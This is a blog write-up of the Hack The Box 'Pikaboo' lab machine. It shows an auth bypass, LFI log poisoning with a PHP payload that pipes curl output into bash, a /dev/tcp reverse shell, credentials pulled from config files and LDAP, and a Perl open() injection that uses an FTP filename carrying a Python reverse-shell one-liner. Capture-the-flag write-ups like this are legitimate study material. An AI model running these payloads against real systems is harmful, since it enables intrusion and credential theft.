<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" href="https://ybenel.cf/favicon.ico"/>


  <script async src="https://www.googletagmanager.com/gtag/js?id=G-12S7XTXXWH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-12S7XTXXWH');
</script>



<!-- Begin Jekyll SEO tag v2.7.1 -->
<title>HTB - Pikaboo | Ybenel</title>
<meta name="generator" content="Jekyll v3.9.1" />
<meta property="og:title" content="HTB - Pikaboo" />
<meta property="og:locale" content="en" />
<meta name="description" content="A Hard Machine That Consist On Exploiting MisConfigurations" />
<meta property="og:description" content="A Hard Machine That Consist On Exploiting MisConfigurations" />
<meta property="og:site_name" content="Ybenel" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-09-17T00:00:00+01:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HTB - Pikaboo" />
<meta name="twitter:site" content="@_ybenel" />
<script type="application/ld+json">
{"description":"A Hard Machine That Consist On Exploiting MisConfigurations","url":"/htb/2021/09/17/Pikaboo.html","@type":"BlogPosting","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/logo.ico"}},"headline":"HTB - Pikaboo","dateModified":"2021-09-17T00:00:00+01:00","datePublished":"2021-09-17T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"/htb/2021/09/17/Pikaboo.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="Ybenel" />




<!-- Google Fonts -->
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open%20Sans|Roboto|Roboto%20Slab|Roboto%20Mono|Dancing%20Script|Noto%20Sans%20SC|Noto%20Sans%20TC|Noto%20Serif%20SC|Noto%20Serif%20TC|Ma%20Shan%20Zheng">

<link rel="stylesheet" href="/assets/css/main.css">
<link rel="stylesheet" href="/assets/css/skin.css">

<!-- Begin selecting skin -->

  <script>
    const hour = (new Date()).getHours();
    let filename = "";
    if (hour >= 5 && hour < 7) {
      filename = "/assets/css/skin-sunrise.css";
    } else if (hour >= 7 && hour < 17) {
      filename = "/assets/css/skin-daylight.css";
    } else if (hour >= 17 && hour < 19) {
      filename = "/assets/css/skin-sunset.css";
    } else {
      filename = "/assets/css/skin-midnight.css";
    }
    const elem = document.createElement("link");
    elem.setAttribute("rel", "stylesheet");
    elem.setAttribute("type", "text/css");
    elem.setAttribute("href", filename);
    document.getElementsByTagName("head")[0].appendChild(elem);
  </script>

<!-- End selecting skin -->

<script async src="https://use.fontawesome.com/releases/v5.0.12/js/all.js"></script>




  </head>

  <body>
    <div class="site-container">
      <header class="site-header">
        <div class="wrapper">
  <script>
    function clickSidebarButton() {
      const elem = document.getElementById("site-sidebar")
      if (elem.style.display == "none" || elem.style.display == "") {
        elem.style.display = "block";
      } else {
        elem.style.display = "none";
      }
    }
  </script>
  <a class="site-sidebar-button" onclick="clickSidebarButton()"><i class="far fa-user"></i>
  </a>

  <a class="site-title" rel="author" href="/">Ybenel</a>

  
    <nav class="site-nav">
      <input type="checkbox" id="nav-trigger" class="nav-trigger" />
      <label for="nav-trigger" title="nav-trigger">
        <span class="menu-icon">
          <svg viewBox="0 0 18 15" width="18px" height="15px">
            <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
          </svg>
        </span>
      </label>

      <ul class="trigger">
              <li><a class="" href="/photos/">Photos</a></li>
            
              <li class="dropdown" href="#">
                <a href="javascript:void(0)" class="dropbtn">Extra</a>
                <div class="dropdown-content">
                    <a class="" href="https://music.ybenel.cf">Music</a>
                    <a class="" href="https://watch.ybenel.cf">Watch</a>
                    <a class="" href="https://search.ybenel.cf">Search</a>
                </div>
              </li>
            
              <li><a class="" href="/about/">About</a></li>
            
              <li class="dropdown" href="#">
                <a href="javascript:void(0)" class="dropbtn">More</a>
                <div class="dropdown-content">
                    <a class="" href="/years/">Years</a>
                    <a class="" href="/categories/">Categories</a>
                    <a class="" href="/tags/">Tags</a>
                </div>
              </li>
            </ul>
    </nav>
  
</div>

      </header>

      <div class="site-body wrapper">
        <aside class="site-sidebar" id="site-sidebar">
          
            <h3 class="toc-title">Table of Contents</h3>
<nav class="toc-nav">
  <ul class="toc">
  <li><a href="#general-enumeration">General Enumeration</a>
    <ul>
      <li><a href="#open-ports">Open Ports</a></li>
      <li><a href="#initial-enum">Initial Enum</a></li>
      <li><a href="#usernames-and-passwords">Usernames And Passwords</a></li>
      <li><a href="#interesting-discoveries">Interesting Discoveries</a></li>
      <li><a href="#vulnerabilities-and-exploitation">Vulnerabilities And Exploitation</a></li>
    </ul>
  </li>
  <li><a href="#user-enumeration">User Enumeration</a>
    <ul>
      <li><a href="#interesting--discoveries">Interesting  Discoveries</a></li>
      <li><a href="#passwords">Passwords</a></li>
      <li><a href="#user">User</a></li>
    </ul>
  </li>
  <li><a href="#privilege-escalation">Privilege Escalation</a>
    <ul>
      <li><a href="#vulnerabities-exploitation">Vulnerabities Exploitation</a></li>
    </ul>
  </li>
</ul>

</nav>

          
        </aside>
        <main class="site-main" id="site-main" aria-label="Content">
          <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">

    <h1 class="post-title p-name" itemprop="name headline">HTB - Pikaboo</h1>
    <p class="post-meta"><time class="dt-published" datetime="2021-09-17T00:00:00+01:00" itemprop="datePublished">
        Sep 17, 2021
      </time>• 
          <span itemprop="author" itemscope itemtype="http://schema.org/Person">
            <span class="p-author h-card" itemprop="name">ybenel</span></span></p>

  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>A Hard Machine That Consist On Exploiting MisConfigurations</p>

<p><a id="orga478a8e"></a></p>

<h1 id="slim-to-none">Slim To None</h1>

<p><a id="orgbd954f4"></a></p>

<h2 id="general-enumeration">General Enumeration</h2>

<p><a id="orga965546"></a></p>

<h3 id="open-ports">Open Ports</h3>

<p>21 (vstpd 3.0.3) - 22 (SSH), 80 (Nginx), 8081 (py HTTP)</p>

<p><a id="orgac5402c"></a></p>

<h3 id="initial-enum">Initial Enum</h3>

<ul>
  <li>Web (80), Has Auth<sub>Basic</sub> (redirect to 401)</li>
  <li>
    <p>Confirmed Path Manipulation (Bypass 401) in /admin</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.249/admin../server-status
</code></pre></div>    </div>
  </li>
</ul>

<p><a id="orgde05944"></a></p>

<h3 id="usernames-and-passwords">Usernames And Passwords</h3>

<ul>
  <li>No Credentials Found</li>
</ul>

<p><a id="orgd93d112"></a></p>

<h3 id="interesting-discoveries">Interesting Discoveries</h3>

<ul>
  <li>admin page (<a href="http://10.10.10.249/admin">http://10.10.10.249/admin</a>) [Requires Credentials]</li>
  <li>weird path /admin/admin<sub>staging</sub></li>
</ul>

<p><a id="orgd7cc00c"></a></p>

<h3 id="vulnerabilities-and-exploitation">Vulnerabilities And Exploitation</h3>

<ul>
  <li>Possible Exploitation Path</li>
</ul>

<div class="proof" id="orgc2a0a36">
<p>
log poisoning lead to RCE through
LFI -&gt; (Cache VSFTPD) -&gt; RCE
</p>

</div>

<ul>
  <li>Exploitation Of (Log Poisoning)
    <ol>
      <li>We do have LFI <a href="http://10.10.10.249/admin../admin_staging/index.php?page=">admin<sub>staging</sub></a></li>
      <li>We Have A Valid Log file (/var/log/vsftpd.log)</li>
      <li>Payload
        <ol>
          <li>USER Field
            <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cp">&lt;?php</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">"curl http://10.10.14.210:8000/rev | bash"</span><span class="p">)</span>
</code></pre></div>            </div>
          </li>
          <li>Inside Of rev
            <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c">#!/bin/bash</span>
    /bin/bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.210/9110 0&gt;&amp;1'</span>
</code></pre></div>            </div>
          </li>
          <li>Curl The Path
            <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    curl http://10.10.10.249/admin../admin_staging/index.php
    ?page<span class="o">=</span>/var/log/vsftpd.log
</code></pre></div>            </div>
          </li>
        </ol>
      </li>
    </ol>
  </li>
  <li>Grab User.txt
<img src="https://ybenel.cf/imgs/pikaboo/user_flag.png" alt="img" /></li>
</ul>

<p><a id="org0744151"></a></p>

<h2 id="user-enumeration">User Enumeration</h2>

<p><a id="org4820c84"></a></p>

<h3 id="interesting--discoveries">Interesting  Discoveries</h3>

<ul>
  <li>Cronjob (root) /usr/local/bin/csvupdate<sub>cron</sub></li>
  <li>/etc/apache2/htpasswd (HTPass Auth Basic) (Salted MD5)</li>
</ul>

<p><a id="orge0cdc6b"></a></p>

<h3 id="passwords">Passwords</h3>

<ol>
  <li>xxj31ZMTZzkVA (/etc/apache2/sites-available/default-ssl.conf)</li>
  <li>Salted MD5 ($apr1$0.2FVvEK$Xn42uf/ySS5IPTKXfebXM.) [Not Cracked]</li>
  <li>J~42%W?PFHl]g (Ldap /opt/pokeapi/config/settings.py)</li>
</ol>

<p><a id="org9d946cd"></a></p>

<h3 id="user">User</h3>

<ul>
  <li>
    <p>Grabing User Password Through Ldap</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch -x -h 127.0.0.1 -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w J~42%W?PFHl]g -b 'dc=ftp,dc=pikaboo,dc=htb'
</code></pre></div>    </div>

    <ul>
      <li>
        <p>pwnmeow user</p>

        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># pwnmeow, users, ftp.pikaboo.htb
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
    
echo -n X0cwdFQ0X0M0dGNIXyczbV80bEwhXw== | base64 -d
_G0tT4_C4tcH_'3m_4lL!_
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
</ul>

<p><a id="org32b305e"></a></p>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<p><a id="org42aa660"></a></p>

<h3 id="vulnerabities-exploitation">Vulnerabities Exploitation</h3>

<p>From The Previous Cronjobs We found we noticed there’s a script /usr/local/bin/csvupdate<sub>cron</sub>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c">#!/bin/bash</span>
    
    <span class="k">for </span>d <span class="k">in</span> /srv/ftp/<span class="k">*</span>
    <span class="k">do
      </span><span class="nb">cd</span> <span class="nv">$d</span>
      /usr/local/bin/csvupdate <span class="si">$(</span><span class="nb">basename</span> <span class="nv">$d</span><span class="si">)</span> <span class="k">*</span>csv
      /usr/bin/rm <span class="nt">-rf</span> <span class="k">*</span>
    <span class="k">done</span>
</code></pre></div></div>
<p>Essentially What the script does is that it lists all the folders exist in /srv/ftp and takes all csv files
and directs them as argument to another script called csvupdate.
Now as we read the perl script, we noticed it does use open() function to open files, However
after little bit of documentation reading we noticed that, if two filenames specified , if one had pipe symbol “|”
it will be interpreted as command thus being executed it.
Now Our Root Path has become more clear to what we should do.
I Found this stack overflow <a href="https://stackoverflow.com/questions/26614348/perl-open-injection-prevention">discussion</a> which demonstrate , how we can achieve this. Unfortunately this was not that simple!
Bash commands were not suitable for this coz of being executed before even attempting to run them, and it the idea was to craft a malicious payload that will be a name of empty file that we will upload to pwnmeow user’s ftp as we got his credentials previously.
Other thing was to create a temporary file that has our payload which we can then execute by calling its full path, tho the issue is that we cannot create filename’s as a path , which left us we fewer options.
Since Python was available, we can use a oneliner reverse shell as our payload , tho it had to be really perfect specially with escaping double quotes.
I Used the following oneliner reverse shell</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.210",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call("sh");'</span>
</code></pre></div></div>
<p>After Editing it to escape double quotes and create an empty file</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">touch</span> <span class="s">"|python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("</span>\<span class="s">"10.10.14.210</span><span class="se">\"</span><span class="s">"</span><span class="p">,</span><span class="mi">1337</span><span class="p">));</span><span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span> <span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span> <span class="n">os</span><span class="p">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">call</span><span class="p">(</span><span class="s">"</span><span class="se">\"</span><span class="s">sh</span><span class="se">\"</span><span class="s">"</span><span class="p">)</span><span class="s">';.csv"
</span></code></pre></div></div>
<p>Then we go back to ftp and upload it, <strong>ONE BIG FAT WARNING</strong> If you tried to upload the file to the root folder, it will not work and file will not be uploaded, and you’ll get really frustrated on why not it didn’t work like myself lol.
Choose any folder , it doesn’t matter which one and upload it to it .
<img src="https://ybenel.cf/imgs/pikaboo/ftp_upload.png" alt="img" />
<strong>Notice</strong> in ur listener it will first connect back from ur machine , kill it immediately and re-run your listener, After few seconds
You’ll receive a
<img src="https://ybenel.cf/imgs/pikaboo/root_flag.png" alt="img" /></p>


  </div>

  <footer class="post-footer">
    
      <div class="post-meta">
        <i class="fas fa-folder"></i>
        <ul class="post-taxonomies post-categories">
          
          
            <li class="post-category">
              
              <a href="/categories/#htb">HTB</a>
            </li>
          
        </ul>
      </div>
    

    
      <div class="post-meta">
        <i class="fas fa-tags"></i>
        <ul class="post-taxonomies post-tags">
          
          
            <li class="post-tag">
              
              <a href="/tags/#htb">htb</a>
            </li>
          
            <li class="post-tag">
              
              <a href="/tags/#hard">hard</a>
            </li>
          
            <li class="post-tag">
              
              <a href="/tags/#lfi">lfi</a>
            </li>
          
            <li class="post-tag">
              
              <a href="/tags/#logs">logs</a>
            </li>
          
            <li class="post-tag">
              
              <a href="/tags/#misconfigurations">misconfigurations</a>
            </li>
          
            <li class="post-tag">
              
              <a href="/tags/#poisoning">poisoning</a>
            </li>
          
        </ul>
      </div>
    

    <nav class="post-pagination" role="navigation">
      
        <a class="post-previous" href="/presequal/2021/09/07/Pre-Sequal.html">
          <i class="fas fa-arrow-left"></i> The Pre Sequal

        </a>
      
    
      
        <a class="post-next" href="/thm/2021/11/22/THM-CyberCrafted.html">
          THM - CyberCrafted
 <i class="fas fa-arrow-right"></i>
        </a>
      
    </nav>
  </footer>

  
  
</article>

          <footer class="site-footer">
            <div class="footer-col-wrapper">

  <div class="footer-col">
    <div class="copyright">
      
      
      
        <!--  -->
        
      
      
      <p>Copyright © 2022 Ybenel; All rights reserved.</p>
      
    </div>
    <!-- <p>
      Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://github.com/ngzhio/jekyll-theme-hamilton">Hamilton</a>
    </p> -->
  </div>

  <div class="footer-col">
    <p>Where All Magic Shows</p>
  </div>
</div>

          </footer>
        </main>
      </div>
    </div>
  </body>

</html>
